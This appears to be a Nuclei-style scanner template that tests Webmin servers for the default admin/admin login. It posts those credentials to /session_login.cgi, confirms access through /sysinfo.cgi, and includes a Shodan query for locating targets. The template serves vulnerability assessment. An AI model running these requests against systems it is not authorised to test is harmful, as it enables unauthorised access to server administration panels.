id: webmin-default-login
info:
  name: Webmin - Default Login
  author: pussycat0x
  severity: high
  description: |
    Webmin default login credentials were discovered.
  reference:
    - https://webmin.com/
    - https://doxfer.webmin.com/Webmin/Installing_Webmin
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:a:webmin:webmin:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Webmin"})
    max-request: 2
    product: webmin
    shodan-query: title:"Webmin"
    vendor: webmin
    verified: true
  tags: default-login,vuln,webmin
http:
  - attack: pitchfork
    host-redirects: true
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - Webmin
          - Backup Configuration Files
          - Webmin Actions Log
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - admin
      username:
        - admin
    raw:
      - |
        POST /session_login.cgi HTTP/1.1
        Host: {{Hostname}}
        Cookie: redirect=1; testing=1
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}
        Accept-Encoding: gzip, deflate

        user={{username}}&pass={{password}}
      - |
        GET /sysinfo.cgi HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: {{RootURL}}
        Accept-Encoding: gzip, deflate
